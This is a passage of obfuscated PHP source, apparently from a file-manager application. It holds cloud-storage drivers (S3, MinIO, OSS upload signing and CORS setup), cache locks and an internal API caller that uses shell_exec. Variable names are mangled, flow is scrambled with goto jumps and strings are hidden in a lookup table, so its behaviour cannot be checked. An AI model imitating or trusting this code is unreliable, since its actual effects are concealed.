$A­±ï˜‡Œˆ[$B‰¯Ú‚ç˜[193]] : !1; $dÚ¡çØ‘ƒ± = $this->link($E­Ÿ‘ƒÀÙ, $B‰¯Ú‚ç˜[1216]); } public function size($Eğ¨“Æ¤à‚) { $bç‰šõİàË = $this->objectMeta($Eğ¨“Æ¤à‚); return $bç‰šõİàË ? $bç‰šõİàË[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]] : 0; } public function info($b¿¸çÆˆÓÔ) { if ($this->isFolder($b¿¸çÆˆÓÔ)) { return $this->folderInfo($b¿¸çÆˆÓÔ); } else { if ($this->isFile($b¿¸çÆˆÓÔ)) { return $this->fileInfo($b¿¸çÆˆÓÔ); } } return !1; } public function exist($CÛåøÈå£ù) { return $this->isFile($CÛåøÈå£ù) || $this->isFolder($CÛåøÈå£ù); } public function isFile($A·Ê“ë””) { return !$this->isFolder($A·Ê“ë””) && $this->objectMeta($A·Ê“ë””); } public function isFolder($B‚Ä­ùÖñÔ) { return $this->cacheMethod($_SERVER[ÚŠ•´ÍéÒÑÔ][220], $B‚Ä­ùÖñÔ); } protected function objectMeta($F¿šÎ—š’†) { return $this->cacheMethod($_SERVER[ÚŠ•´ÍéÒÑÔ][221], $F¿šÎ—š’†); } protected function _objectMeta($D…–åÓÔÉè) { $E‚ê‚§äî =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; list($dÀç¿ÍÒ , $DãïŒ¡³†) = $this->bucketManager->stat($this->bucket, $D…–åÓÔÉè); if ($dÀç¿ÍÒ ) { $dÀç¿ÍÒ [$E‚ê‚§äî[77]] = intval($dÀç¿ÍÒ [$E‚ê‚§äî[1203]]); } return $dÀç¿ÍÒ ; } protected function _isFolder($féİ‚¤ÊÆÏ) { $f¨»İ‚Æ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; list($B©ïÕó…ù“, $d¹ÈİÑŠà) = $this->bucketManager->listFiles($this->bucket, trim($féİ‚¤ÊÆÏ, $f¨»İ‚Æ[8]) . $f¨»İ‚Æ[8], $f¨»İ‚Æ[33], 1, $f¨»İ‚Æ[8]); return !empty($B©ïÕó…ù“[$f¨»İ‚Æ[1202]]) || !empty($B©ïÕó…ù“[$f¨»İ‚Æ[1205]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($eÅöäâö†È) { parent::__construct($eÅöäâö†È); } public function uploadFormData($D“Ï³»ëá¬, $B–çñÕÄ¥« = 3600) { goto c¨šï¨Å‡; a¸øŒí˜Ü: $BİàÇãÏ› = array($D×ÆöÔ‚šù[196] => $D×ÆöÔ‚šù[33], $D×ÆöÔ‚šù[1130] => $D×ÆöÔ‚šù[33], $D×ÆöÔ‚šù[1089] => $d­ó¥Üê‘ä, $D×ÆöÔ‚šù[1093] => $F˜ƒÂ áŞó, $D×ÆöÔ‚šù[1097] => $cƒ ¹êŒï…, $D×ÆöÔ‚šù[1131] => $E›õ›¢×Öµ, $D×ÆöÔ‚šù[1132] => $b½‡á«®, $D×ÆöÔ‚šù[1133] => $Eğ³äãÜå×, $D×ÆöÔ‚šù[1134] => $BÓ¢øãğïÂ, $D×ÆöÔ‚šù[1135] => $Aî•¹Û¤â³, $D×ÆöÔ‚šù[166] => $this->getHost()); return $BİàÇãÏ›; goto eèÔËØÅ”·; E‘ö”Ï¨Ó®: $AŒÁœš‡æ = hash_hmac($D×ÆöÔ‚šù[1128], $e—½ôš³²ƒ, $E›‘Š¶’¦Ğ, !0); $B»‚…¼ô‹´ = hash_hmac($D×ÆöÔ‚šù[1128], $aøóŒîÇË, $AŒÁœš‡æ, !0); $Aî•¹Û¤â³ = hash_hmac($D×ÆöÔ‚šù[1128], $cƒ ¹êŒï…, $B»‚…¼ô‹´); goto a¸øŒí˜Ü; cñ„ËÔ¼‡—: $cƒ ¹êŒï… = base64_encode(json_encode($b‡ÛÀ™¿è)); $d†ä¨ºíÙ† = hash_hmac($D×ÆöÔ‚šù[1128], $Aïà‘½®§, $D×ÆöÔ‚šù[1129] . $this->secret, !0); $E›‘Š¶’¦Ğ = hash_hmac($D×ÆöÔ‚šù[1128], $this->region, $d†ä¨ºíÙ†, !0); goto E‘ö”Ï¨Ó®; b‰Ñ¥÷°Óõ: $aøóŒîÇË = $D×ÆöÔ‚šù[1120]; $BÓ¢øãğïÂ = $B–çñÕÄ¥« . $D×ÆöÔ‚šù[33]; $F˜ƒÂ áŞó = $D×ÆöÔ‚šù[1085]; goto a†šŒí˜÷; F ¸îáì½: $e—½ôš³²ƒ = $D×ÆöÔ‚šù[59]; $Eğ³äãÜå× = gmdate($D×ÆöÔ‚šù[1119]); $Aïà‘½®§ = gmdate($D×ÆöÔ‚šù[685]); goto b‰Ñ¥÷°Óõ; a†šŒí˜÷: $b—Æƒ®Şç = array($this->accessKey, $Aïà‘½®§, $this->region, $e—½ôš³²ƒ, $aøóŒîÇË); $E›õ›¢×Öµ = implode($D×ÆöÔ‚šù[8], $b—Æƒ®Şç); $b‡ÛÀ™¿è = array($D×ÆöÔ‚šù[1087] => gmdate($D×ÆöÔ‚šù[1086], strtotime($D×ÆöÔ‚šù[1121])), $D×ÆöÔ‚šù[1088] => array(array($D×ÆöÔ‚šù[1090] => $this->bucket), array($D×ÆöÔ‚šù[1089] => $d­ó¥Üê‘ä), array($D×ÆöÔ‚šù[1091], $D×ÆöÔ‚šù[1092], $D×ÆöÔ‚šù[33]), array($D×ÆöÔ‚šù[1091], $D×ÆöÔ‚šù[1122], $D×ÆöÔ‚šù[33]), array($D×ÆöÔ‚šù[1091], $D×ÆöÔ‚šù[1123], $D×ÆöÔ‚šù[33]), array($D×ÆöÔ‚šù[1093] => $F˜ƒÂ áŞó), array($D×ÆöÔ‚šù[1124] => $E›õ›¢×Öµ), array($D×ÆöÔ‚šù[1125] => $b½‡á«®), array($D×ÆöÔ‚šù[1126] => $Eğ³äãÜå×), array($D×ÆöÔ‚šù[1127] => $BÓ¢øãğïÂ))); goto cñ„ËÔ¼‡—; c¨šï¨Å‡: $D×ÆöÔ‚šù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d­ó¥Üê‘ä = $D×ÆöÔ‚šù[182]; $b½‡á«® = $D×ÆöÔ‚šù[1118]; goto F ¸îáì½; eèÔËØÅ”·: } public function multiUploadFormData($DˆîÅö¾ãÄ, $EˆÁŒ•ñ = 3600) { $bİƒÄòº =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BâçŸåËá† = gmdate($bİƒÄòº[1217]); $eƒ¹²¾ƒ²‘ = array(); $B™ˆ½ø¤†ƒ = $this->client->getUploadId($this->bucket, $DˆîÅö¾ãÄ, $eƒ¹²¾ƒ²‘); if (!$B™ˆ½ø¤†ƒ) { return !1; } return array($bİƒÄòº[206] => $B™ˆ½ø¤†ƒ, $bİƒÄòº[166] => $this->getHost() . $bİƒÄòº[8] . $this->pathEncode($DˆîÅö¾ãÄ), $bİƒÄòº[207] => $BâçŸåËá†, $bİƒÄòº[89] => $DˆîÅö¾ãÄ); } public function multiUploadAuthData($c£”Ã»ËÅè, $eí¬ƒÓÇ‹à = array()) { goto e²èÎŸÇÆ£; DÇÔ¤Ÿ‰­: if (strpos($fĞÄ˜‡í»Á, $eù–ÉÛ®»Ì[210]) === 0) { if (isset($aÎÚÇ…ôàØ[$eù–ÉÛ®»Ì[1219]])) { $BÒÒÑÍ«ˆ‡ = $aÎÚÇ…ôàØ[$eù–ÉÛ®»Ì[1219]]; } else { if (isset($Eİô¼ò¼Â…[$eù–ÉÛ®»Ì[1219]])) { $BÒÒÑÍ«ˆ‡ = $Eİô¼ò¼Â…[$eù–ÉÛ®»Ì[1219]]; } else { $BÒÒÑÍ«ˆ‡ = hash($eù–ÉÛ®»Ì[1128], $eù–ÉÛ®»Ì[33]); } } return array($eù–ÉÛ®»Ì[217] => $Eİô¼ò¼Â…[$eù–ÉÛ®»Ì[217]], $eù–ÉÛ®»Ì[1219] => $BÒÒÑÍ«ˆ‡, $eù–ÉÛ®»Ì[207] => $Eİô¼ò¼Â…[$eù–ÉÛ®»Ì[1222]]); } return $Eİô¼ò¼Â…[$eù–ÉÛ®»Ì[217]]; goto d”‘¸ÏºŸ; e³·èšª¬÷: if (isset($eí¬ƒÓÇ‹à[$eù–ÉÛ®»Ì[1218]])) { $aÎÚÇ…ôàØ[$eù–ÉÛ®»Ì[1219]] = $eí¬ƒÓÇ‹à[$eù–ÉÛ®»Ì[1218]]; } $Eù’ç„İáÅ = explode($eù–ÉÛ®»Ì[168], $this->getHost()); $B¤ŸôºêŸ– = array($eù–ÉÛ®»Ì[1220] => $Eù’ç„İáÅ[1], $eù–ÉÛ®»Ì[1221] => $eù–ÉÛ®»Ì[33], $eù–ÉÛ®»Ì[196] => $eù–ÉÛ®»Ì[116], $eù–ÉÛ®»Ì[1130] => $eí¬ƒÓÇ‹à[$eù–ÉÛ®»Ì[77]]); goto b„íÇ²Ì; b„íÇ²Ì: $E„§÷Ã½Ì = $eù–ÉÛ®»Ì[211]; $bÍ©½šßğ» = $eù–ÉÛ®»Ì[8] . $this->pathEncode($DàŠŠ½Œš°) . $fĞÄ˜‡í»Á; $Eİô¼ò¼Â… = $this->client->__getSignatureV4($aÎÚÇ…ôàØ, $B¤ŸôºêŸ–, $E„§÷Ã½Ì, $bÍ©½šßğ»); goto DÇÔ¤Ÿ‰­; Cãªäµ©ˆÏ: unset($eí¬ƒÓÇ‹à[$eù–ÉÛ®»Ì[89]]); if (isset($eí¬ƒÓÇ‹à[$eù–ÉÛ®»Ì[208]])) { return $this->listUploadParts($DàŠŠ½Œš°, $eí¬ƒÓÇ‹à); } $aÎÚÇ…ôàØ = array(); goto e³·èšª¬÷; e²èÎŸÇÆ£: $eù–ÉÛ®»Ì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fĞÄ˜‡í»Á = isset($eí¬ƒÓÇ‹à[$eù–ÉÛ®»Ì[157]]) ? $eí¬ƒÓÇ‹à[$eù–ÉÛ®»Ì[157]] : $eù–ÉÛ®»Ì[33]; $DàŠŠ½Œš° = $eí¬ƒÓÇ‹à[$eù–ÉÛ®»Ì[89]]; goto Cãªäµ©ˆÏ; d”‘¸ÏºŸ: } public function listUploadParts($EÈìÅŠá´š, $e±ÊÙ‡Áæ = array()) { goto BíôäÖ·â¸; eÑ‡ˆç¨­: $E¶§ä´ˆè‘ = array($DÇ„ë©Ù‹[1220] => $FñÇ„Ö›Ã¸[1], $DÇ„ë©Ù‹[196] => $DÇ„ë©Ù‹[116], $DÇ„ë©Ù‹[1130] => strlen($aõÒˆÁ‚Íê)); $BÓù»…ÒÕ = $DÇ„ë©Ù‹[209]; $CÃ¢§‡ùÖ = $DÇ„ë©Ù‹[8] . $this->pathEncode($EÈìÅŠá´š) . $e±ÊÙ‡Áæ[$DÇ„ë©Ù‹[157]]; goto D™àÂåäé÷; EçÖù‹¸ìë: $aõÒˆÁ‚Íê .= $DÇ„ë©Ù‹[1226]; $DÚƒ Øî„í = array(); $FñÇ„Ö›Ã¸ = explode($DÇ„ë©Ù‹[168], $this->getHost()); goto eÑ‡ˆç¨­; eİöğ‰º©ä: if (!$E³²Ä§‡) { return !1; } $aõÒˆÁ‚Íê = $DÇ„ë©Ù‹[1223]; foreach ($E³²Ä§‡ as $CÀœ…õ—©) { $aõÒˆÁ‚Íê .= $DÇ„ë©Ù‹[1224] . "\x3c\x50\141\162\x74\116\x75\155\x62\x65\162\76{$CÀœ…õ—©[$DÇ„ë©Ù‹[1175]]}\x3c\x2f\x50\141\x72\x74\x4e\165\x6d\x62\x65\162\76\12" . "\74\105\124\x61\x67\76{$CÀœ…õ—©[$DÇ„ë©Ù‹[1176]]}\x3c\57\105\124\141\147\76\xa" . $DÇ„ë©Ù‹[1225]; } goto EçÖù‹¸ìë; D™àÂåäé÷: $e“‚•÷“»¤ = $this->client->__getSignatureV4($DÚƒ Øî„í, $E¶§ä´ˆè‘, $BÓù»…ÒÕ, $CÃ¢§‡ùÖ, $aõÒˆÁ‚Íê); return array($DÇ„ë©Ù‹[217] => $e“‚•÷“»¤[$DÇ„ë©Ù‹[217]], $DÇ„ë©Ù‹[207] => $e“‚•÷“»¤[$DÇ„ë©Ù‹[1222]], $DÇ„ë©Ù‹[219] => $E³²Ä§‡, $DÇ„ë©Ù‹[1219] => $e“‚•÷“»¤[$DÇ„ë©Ù‹[1219]]); goto C¢ßÅ±Ü³Ñ; BíôäÖ·â¸: $DÇ„ë©Ù‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eÎù‹´³‡ = str_replace($DÇ„ë©Ù‹[218], $DÇ„ë©Ù‹[33], $e±ÊÙ‡Áæ[$DÇ„ë©Ù‹[157]]); $E³²Ä§‡ = $this->client->listParts($this->bucket, $EÈìÅŠá´š, $eÎù‹´³‡); goto eİöğ‰º©ä; C¢ßÅ±Ü³Ñ: } public function link($dƒœÌ¶âõ, $fÏ»­ƒ“ÒĞ = array()) { return parent::link($dƒœÌ¶âõ, $fÏ»­ƒ“ÒĞ); } public function fileOut($Eã“„Ô”Šì, $EÉ†À´õ¥Ÿ = false, $fš£ĞÔÙêò = false, $B¡³ÚÈñ½è = '') { if (strstr($this->endpoint, $_SERVER[ÚŠ•´ÍéÒÑÔ][1227])) { return parent::fileOutServer($Eã“„Ô”Šì, $EÉ†À´õ¥Ÿ, $fš£ĞÔÙêò, $B¡³ÚÈñ½è); } parent::fileOut($Eã“„Ô”Šì, $EÉ†À´õ¥Ÿ, $fš£ĞÔÙêò, $B¡³ÚÈñ½è); } public function fileOutImage($Có´¾‚¹ğœ, $C‰ìŒ‰—³Ó = 250) { if (strstr($this->endpoint, $_SERVER[ÚŠ•´ÍéÒÑÔ][1227])) { return parent::fileOutImageServer($Có´¾‚¹ğœ, $C‰ìŒ‰—³Ó); } parent::fileOutImage($Có´¾‚¹ğœ, $C‰ìŒ‰—³Ó); } public function fileOutLink($CÂÑ»ŠÙ¢) { $bÏä¿Å¦œ¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (substr($CÂÑ»ŠÙ¢, 0, 7) == $bÏä¿Å¦œ¼[1100]) { $CÂÑ»ŠÙ¢ = $bÏä¿Å¦œ¼[1101] . substr($CÂÑ»ŠÙ¢, 7); } header($bÏä¿Å¦œ¼[153] . $CÂÑ»ŠÙ¢); die; } public function getHost() { $D—É¼öé³… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Eåääéµ‡ = str_rtrim(parent::getHost(), $D—É¼öé³…[8] . $this->bucket); $Eåääéµ‡ = explode($D—É¼öé³…[168], $Eåääéµ‡); return $Eåääéµ‡[0] . $D—É¼öé³…[168] . $this->bucket . $D—É¼öé³…[93] . $Eåääéµ‡[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($fæŠùç…Ëè, $cÀèÑó©ƒœ = 0) { parent::__construct(); $this->source = $fæŠùç…Ëè; $this->sourceSize = $cÀèÑó©ƒœ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($B“àÌºêö = false) { return $this->sourceSize; } public function getContent($BçÄÀ…•Š = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Eê‚¶‹ï¥ª = ftell($this->source); $a†³Ê°¦Âã = @fread($this->source, $this->sourceSize); fseek($this->source, $Eê‚¶‹ï¥ª); return $a†³Ê°¦Âã; } } public function fileSubstr($d—Æ›…¤š = false, $Bİ¦ŒÙ·æ¨ = 0, $F±íƒŸêğ’ = 0) { if (!$F±íƒŸêğ’) { $F±íƒŸêğ’ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Bİ¦ŒÙ·æ¨, $F±íƒŸêğ’); } if ($this->sourceType == self::TYPE_FILE) { $a×«ïŞ´ñ‡ = ftell($this->source); fseek($this->source, $a×«ïŞ´ñ‡ + $Bİ¦ŒÙ·æ¨); $D‚“‹æöÚÕ = @fread($this->source, $F±íƒŸêğ’); fseek($this->source, $a×«ïŞ´ñ‡); return $D‚“‹æöÚÕ; } } public function hashMd5($DÇÙ¶ÖæØ = false) { return md5($this->getContent()); } public static function hash($dãÇÛ‹Ş¡, $eµ¦Œ»…¼ñ = 0) { $AìŠ¶ÖŠ—– = new PathDriverStream($dãÇÛ‹Ş¡, $eµ¦Œ»…¼ñ); return $AìŠ¶ÖŠ—–->hashSimple($dãÇÛ‹Ş¡); } public static function md5($CÇíğÀï‹, $däœ”ë„ƒ¢ = 0) { $D¬×¶‡‘¥× = new PathDriverStream($CÇíğÀï‹, $däœ”ë„ƒ¢); return $D¬×¶‡‘¥×->hashMd5($CÇíğÀï‹); } } goto a±‚½Ã¶; a©´˜±†¿ˆ: function ActionCall($BÑ¼¯²Ãæì) { $AÉ¨Äõƒ×¤ = array_slice(func_get_args(), 1); return ActionApply($BÑ¼¯²Ãæì, $AÉ¨Äõƒ×¤); } function ActionCallApi($A“ø‘‡¯æÒ, $C° ÀËÈƒ = '') { goto A‰Ë‡±÷•ì; A‰Ë‡±÷•ì: $CœŠÈÃÖì =& $_SERVER[Ÿ²ù¬]; $aôÕ™õÄôì = $C° ÀËÈƒ; if (is_array($C° ÀËÈƒ)) { $aôÕ™õÄôì = $CœŠÈÃÖì[20]; foreach ($C° ÀËÈƒ as $AÚèáÃºÁ† => $DŠÜÓøÍˆ—) { $DŠÜÓøÍˆ— = is_array($DŠÜÓøÍˆ—) ? json_encode($DŠÜÓøÍˆ—) : $DŠÜÓøÍˆ—; $DŠÜÓøÍˆ— = is_bool($DŠÜÓøÍˆ—) ? intval($DŠÜÓøÍˆ—) : $DŠÜÓøÍˆ—; $aôÕ™õÄôì .= $CœŠÈÃÖì[21] . $AÚèáÃºÁ† . $CœŠÈÃÖì[22] . rawurlencode($DŠÜÓøÍˆ—); } } goto cŒ”ÉÄñˆÒ; eÎÜ­ÊÜè: return $cƒˆÀ¥ìİ; goto FÅªºŒŠ½¦; cŒ”ÉÄñˆÒ: $d˜Èİ¿ëº¸ = Action($CœŠÈÃÖì[23])->accessToken(); $A“ø‘‡¯æÒ = str_replace($CœŠÈÃÖì[5], $CœŠÈÃÖì[4], $A“ø‘‡¯æÒ) . $CœŠÈÃÖì[24] . $d˜Èİ¿ëº¸ . $aôÕ™õÄôì; $e¸È„¸ØŸ = $CœŠÈÃÖì[20]; goto Cé·î†šºÙ; b¾§’âˆ²Ë: $a©¤¹¥åÚ« = json_decode($e¸È„¸ØŸ, !0); $cƒˆÀ¥ìİ = is_array($a©¤¹¥åÚ«) ? $a©¤¹¥åÚ« : array($CœŠÈÃÖì[33] => null, $CœŠÈÃÖì[34] => $e¸È„¸ØŸ); if (!$a©¤¹¥åÚ«) { echo $e¸È„¸ØŸ; } goto eÎÜ­ÊÜè; Cé·î†šºÙ: $CÄ†³çÈİÉ = phpBinCommand(); if ($CÄ†³çÈİÉ && function_exists($CœŠÈÃÖì[25])) { $A‚‹³½‡‚ = $CÄ†³çÈİÉ . $CœŠÈÃÖì[26] . BASIC_PATH . $CœŠÈÃÖì[27] . escapeshellarg($A“ø‘‡¯æÒ); $e¸È„¸ØŸ = shell_exec($A‚‹³½‡‚); } if (!$e¸È„¸ØŸ) { $E æ¤Ö‡áæ = stream_context_create(array($CœŠÈÃÖì[28] => array($CœŠÈÃÖì[29] => 20, $CœŠÈÃÖì[30] => $CœŠÈÃÖì[31]))); $e¸È„¸ØŸ = file_get_contents(APP_HOST . $CœŠÈÃÖì[32] . $A“ø‘‡¯æÒ, !1, $E æ¤Ö‡áæ); } goto b¾§’âˆ²Ë; FÅªºŒŠ½¦: } function ActionCallHook($fŠ¥òÇæâÜ) { goto f‘’³ Ç‰’; CƒĞÇœ‡: $BùÀÂ¦Ú’Ø = $EšßµÚ†êá ? json_decode($EšßµÚ†êá, !0) : $BùÀÂ¦Ú’Ø; $GLOBALS[$AØó•à¨´¸[35]] = 0; return $BùÀÂ¦Ú’Ø; goto fÂ¾ªŸ¢Ç˜; f‘’³ Ç‰’: $AØó•à¨´¸ =& $_SERVER[Ÿ²ù¬]; ob_start(); $C­«áæ¯ˆ = array_slice(func_get_args(), 1); goto Aï–éÙŒØ; Aï–éÙŒØ: $GLOBALS[$AØó•à¨´¸[35]] = 1; $BùÀÂ¦Ú’Ø = ActionApply($fŠ¥òÇæâÜ, $C­«áæ¯ˆ); $EšßµÚ†êá = ob_get_clean(); goto CƒĞÇœ‡; fÂ¾ªŸ¢Ç˜: } goto AŒÖ‘áåš—; AÂèò‹ÒÇæ: class CacheLockMemcached { public function lock($EÕ³Ê…™œ÷, $FÜğ‹Üå = 0) { $Dš Š‡ìÄ = Cache::init(); $B³ÂÉóºëŠ = microtime(!0) + $FÜğ‹Üå; while (microtime(!0) < $B³ÂÉóºëŠ) { $eÉè©åšÌ = $Dš Š‡ìÄ->get($EÕ³Ê…™œ÷); if (!$eÉè©åšÌ || $eÉè©åšÌ < microtime(!0)) { $A‹Ù…’ù¯ = $Dš Š‡ìÄ->handle->add($EÕ³Ê…™œ÷, $B³ÂÉóºëŠ, $FÜğ‹Üå); if ($A‹Ù…’ù¯) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eª«æ¥ãÕí) { return Cache::init()->get($eª«æ¥ãÕí); } public function unlock($A‡É’†ÆŸ) { return Cache::init()->remove($A‡É’†ÆŸ); } } class CacheLockDatabase { public function lock($b³‡²Êšø¼, $d˜Î…ÉÈÔ = 0) { $BÉ•˜§ßÛº = Model($_SERVER[ÚŠ•´ÍéÒÑÔ][750]); $dîğ›ÖÈ¿Ä = microtime(!0) + $d˜Î…ÉÈÔ; while (microtime(!0) < $dîğ›ÖÈ¿Ä) { $Fµˆ°»´Õ‹ = $BÉ•˜§ßÛº->get($b³‡²Êšø¼); if (!$Fµˆ°»´Õ‹ || $Fµˆ°»´Õ‹ < microtime(!0)) { $Cµ†Œª†¹’ = $BÉ•˜§ßÛº->set($b³‡²Êšø¼, $dîğ›ÖÈ¿Ä); if ($Cµ†Œª†¹’) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($D‡ëÛĞ±Â¡) { return Model($_SERVER[ÚŠ•´ÍéÒÑÔ][750])->get($D‡ëÛĞ±Â¡); } public function unlock($díÙ·ë¥ÖÄ) { Model($_SERVER[ÚŠ•´ÍéÒÑÔ][750])->remove($díÙ·ë¥ÖÄ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($BøîÇî¢ºÀ, $FÆÌŸïåÃ) { $aâÇ·¢Ã¤… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!class_exists($aâÇ·¢Ã¤…[771])) { show_json($aâÇ·¢Ã¤…[772], !1); } $this->cacheTime = $FÆÌŸïåÃ; $this->handle = new Memcached(); if (is_array($BøîÇî¢ºÀ[$aâÇ·¢Ã¤…[773]]) && count($BøîÇî¢ºÀ[$aâÇ·¢Ã¤…[773]]) >= 1) { foreach ($BøîÇî¢ºÀ[$aâÇ·¢Ã¤…[773]] as $EÃÕôæñø) { $dÈğÀƒª¦‰ = explode($aâÇ·¢Ã¤…[4], $EÃÕôæñø); $this->handle->addServer($dÈğÀƒª¦‰[0], $dÈğÀƒª¦‰[1]); } } else { $this->handle->addServer($BøîÇî¢ºÀ[$aâÇ·¢Ã¤…[166]], $BøîÇî¢ºÀ[$aâÇ·¢Ã¤…[167]]); } } public function set($dÆ‹›¼“¬, $bÊïö‘ßê©, $Açİô‘£Ÿ = false) { $Açİô‘£Ÿ = $Açİô‘£Ÿ ? $Açİô‘£Ÿ : $this->cacheTime; return $this->handle->set($dÆ‹›¼“¬, $bÊïö‘ßê©, $Açİô‘£Ÿ); } public function get($cùèŒº¨Œ¾) { return $this->handle->get($cùèŒº¨Œ¾); } public function remove($f˜È¾ÓÙ‘) { return $this->handle->delete($f˜È¾ÓÙ‘); } public function deleteAll() { return $this->handle->flush(); } } goto f¤ÍˆÛ‚±ì; fÀï„’‘ÑÁ: define($_SERVER[ÚŠ•´ÍéÒÑÔ][224], 2); define($_SERVER[ÚŠ•´ÍéÒÑÔ][225], 3); define($_SERVER[ÚŠ•´ÍéÒÑÔ][226], 1); goto cç”½´ˆî; eÅóïÚİäà: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($E¦”ƒ»½¤Ï) { parent::__construct($E¦”ƒ»½¤Ï); $this->signatureVersion($_SERVER[ÚŠ•´ÍéÒÑÔ][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($A£­›¸§•Œ) { parent::__construct($A£­›¸§•Œ); $this->signatureVersion($_SERVER[ÚŠ•´ÍéÒÑÔ][197]); } public function fileOutLink($c©…•æ•Ó) { $cÊŠğ…Îë÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (substr($c©…•æ•Ó, 0, 7) == $cÊŠğ…Îë÷[1100]) { $c©…•æ•Ó = $cÊŠğ…Îë÷[1101] . substr($c©…•æ•Ó, 7); } header($cÊŠğ…Îë÷[153] . $c©…•æ•Ó); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($A²¯Âê­ƒ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÚŠ•´ÍéÒÑÔ][1158]; $this->_init($A²¯Âê­ƒ); } public function _init($Cç»¶¶Ê§¥) { foreach ($Cç»¶¶Ê§¥ as $A‘ÅÌª¼í => $E¥ëîéÌ) { if (isset($this->{$A‘ÅÌª¼í})) { $this->{$A‘ÅÌª¼í} = $E¥ëîéÌ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ÚŠ•´ÍéÒÑÔ][1159], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto e¨È§´×š; eÜÙã°»«: $BÃ‘¼·§Ê->addRule($e™¥Ş­±êÓ); try { $this->client->putBucketCors($this->bucket, $BÃ‘¼·§Ê); } catch (OSS\Core\OssException $b³ÉÉòï) { return !1; } return !0; goto Eö›®ïÒÌÇ; e¨È§´×š: $bÚ™ĞÎÌÒ¨ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÃ‘¼·§Ê = new OSS\Model\CorsConfig(); $e™¥Ş­±êÓ = new OSS\Model\CorsRule(); goto B„˜‚ï˜˜Õ; DÂŞØ›‘°Û: $e™¥Ş­±êÓ->setMaxAgeSeconds(600); $e™¥Ş­±êÓ->addExposeHeader($bÚ™ĞÎÌÒ¨[1165]); $e™¥Ş­±êÓ->addAllowedHeader($bÚ™ĞÎÌÒ¨[1160]); goto eÜÙã°»«; B„˜‚ï˜˜Õ: $e™¥Ş­±êÓ->addAllowedOrigin($bÚ™ĞÎÌÒ¨[1160]); $e™¥Ş­±êÓ->addAllowedMethod($bÚ™ĞÎÌÒ¨[1161]); $e™¥Ş­±êÓ->addAllowedMethod($bÚ™ĞÎÌÒ¨[1162]); goto EŒŸİ¤Ï ; EŒŸİ¤Ï : $e™¥Ş­±êÓ->addAllowedMethod($bÚ™ĞÎÌÒ¨[1163]); $e™¥Ş­±êÓ->addAllowedMethod($bÚ™ĞÎÌÒ¨[1164]); $e™¥Ş­±êÓ->addAllowedMethod($bÚ™ĞÎÌÒ¨[152]); goto DÂŞØ›‘°Û; Eö›®ïÒÌÇ: } public function getBucketCors() { goto a™Íö©‡â; A®ŠŸ‘Ñà: if (!$A†¯“¶¼Œ± || !($Bí‡øöÔ²³ = $A†¯“¶¼Œ±->getRules())) { return null; } $dÆç§ì×«Œ = $Bí‡øöÔ²³[0]->getAllowedOrigins(); $EàÔäğ¨¯ = $Bí‡øöÔ²³[0]->getAllowedMethods(); goto dæ³ÉíĞ¥; a™Íö©‡â: $b˜‰Œ‘•ñ® =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A†¯“¶¼Œ± = null; try { $A†¯“¶¼Œ± = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $B‘÷ºÜ‡ÀÄ) { return null; } goto A®ŠŸ‘Ñà; dæ³ÉíĞ¥: $c¸Æéƒ¼İé = $Bí‡øöÔ²³[0]->getMaxAgeSeconds(); $aãÍ¸„ƒ…ø = $Bí‡øöÔ²³[0]->getExposeHeaders(); $aÈÚœÆ›‘Š = $Bí‡øöÔ²³[0]->getAllowedHeaders(); goto añ¼ÖÇ¼öˆ; añ¼ÖÇ¼öˆ: return array($b˜‰Œ‘•ñ®[172] => isset($dÆç§ì×«Œ[0]) ? $dÆç§ì×«Œ[0] : $b˜‰Œ‘•ñ®[33], $b˜‰Œ‘•ñ®[176] => $EàÔäğ¨¯, $b˜‰Œ‘•ñ®[1166] => $c¸Æéƒ¼İé, $b˜‰Œ‘•ñ®[1167] => isset($aãÍ¸„ƒ…ø[0]) ? $aãÍ¸„ƒ…ø[0] : $b˜‰Œ‘•ñ®[33], $b˜‰Œ‘•ñ®[174] => isset($aÈÚœÆ›‘Š[0]) ? $aÈÚœÆ›‘Š[0] : $b˜‰Œ‘•ñ®[33]); goto Dä¡àë¥‹; Dä¡àë¥‹: } public function isBucketCors() { goto FøØ©‘…‰í; FøØ©‘…‰í: $bÕ˜„İÊ“ƒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aœÉÄ¢ºÔ = $this->getBucketCors(); if (!$aœÉÄ¢ºÔ || !is_array($aœÉÄ¢ºÔ)) { return !1; } goto aÅ«§è¼¤¿; 